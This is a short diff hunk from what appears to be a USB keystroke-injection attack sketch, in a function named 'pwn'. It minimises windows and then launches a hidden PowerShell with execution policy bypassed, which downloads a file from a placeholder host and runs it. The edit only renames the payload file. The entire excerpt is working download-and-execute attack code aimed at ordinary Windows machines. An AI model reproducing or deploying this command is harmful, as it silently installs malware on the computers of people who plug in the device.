@@ -43,7 +43,7 @@ void pwn()
   key(KEY_D , MODIFIERKEY_RIGHT_GUI);
   delay(delayTime);
 
-  openapp("powershell -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('HOST','PAYLOAD.exe');/PAYLOAD.exe");
+  openapp("powershell -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('HOST','PAYLOAD');/PAYLOAD");
   delay(2000);
  key(KEY_LEFT, 0);
  delay(500);
